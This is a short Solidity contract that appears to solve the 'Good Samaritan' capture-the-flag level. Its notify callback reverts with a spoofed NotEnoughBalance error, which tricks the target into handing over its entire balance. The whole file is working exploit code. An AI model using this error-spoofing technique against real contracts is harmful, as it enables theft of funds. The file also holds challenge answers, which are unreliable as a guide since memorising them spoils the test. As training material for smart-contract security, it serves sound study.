// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface GoodSamaritan {
    function requestDonation() external returns (bool);
}

contract GoodSamaritanSolution {
    error NotEnoughBalance();

    function solve(address _goodSamaritan) external {
        GoodSamaritan(_goodSamaritan).requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}